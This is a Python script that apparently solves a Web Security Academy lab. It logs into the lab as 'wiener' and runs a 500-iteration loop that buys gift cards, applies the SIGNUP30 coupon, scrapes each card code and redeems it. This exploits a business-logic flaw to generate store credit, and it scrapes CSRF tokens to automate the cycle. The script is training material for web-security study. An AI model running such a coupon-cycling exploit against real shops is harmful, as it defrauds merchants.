import requests
import re


url = 'https://0a6e002504006829801b0dda00cb00cc.web-security-academy.net'  #change URL HERE

username = 'wiener'
password = 'peter'

session = requests.Session()

# GET /login:

res = session.get(f'{url}/login')
token_match = re.search(r'name="csrf" value="([a-zA-Z0-9]+)"' , res.text).group(1)

# POST /login
auth = session.post(url=f'{url}/login', data=f'csrf={token_match}&username={username}&password={password}',headers={"Content-Type":"application/x-www-form-urlencoded"})

#Run macros:
for i in range(500):
	print(f'[*]Testing {i}')
	
	#buy gift card:
	res2 = session.post(url=f'{url}/cart', data='productId=2&redir=PRODUCT&quantity=1', headers={"Content-Type":"application/x-www-form-urlencoded"})
	
	#get csrf:
	res3 = session.get(url=f'{url}/cart')
	token_match2 = re.findall(r'name="csrf" value="([a-zA-Z0-9]+)"', res3.text)[0]
	token_match3 = re.findall(r'name="csrf" value="([a-zA-Z0-9]+)"', res3.text)[1]

	#apply cuppon:
	res4 = session.post(url=f'{url}/cart/coupon',data=f'csrf={token_match2}&coupon=SIGNUP30',headers={"Content-Type":"application/x-www-form-urlencoded"})
	
	#but the gift card:
	res5 = session.post(url=f'{url}/cart/checkout', data=f'csrf={token_match3}', headers={"Content-Type":"application/x-www-form-urlencoded"} , allow_redirects=True)
	
	#get the gift card code :
	code_match = re.findall(r'<td>([a-zA-Z0-9]+)</td>' , res5.text)[1]
	print(f'[+]Found code: {code_match}')
	
	#get csrf:
	res6 = session.get(url=f'{url}/my-account')
	token_match4 = re.findall(r'name="csrf" value="([a-zA-Z0-9]+)"', res6.text)[1]
	
	#redeem the code:
	print('redeem successfully')
	try:
		res7 = session.post(url=f'{url}/gift-card' ,data=f'csrf={token_match4}&gift-card={code_match}',headers={"Content-Type":"application/x-www-form-urlencoded"})
	except Exception as e:
		print(f'WHY DID YOU REDEEM IT : {e}')
	


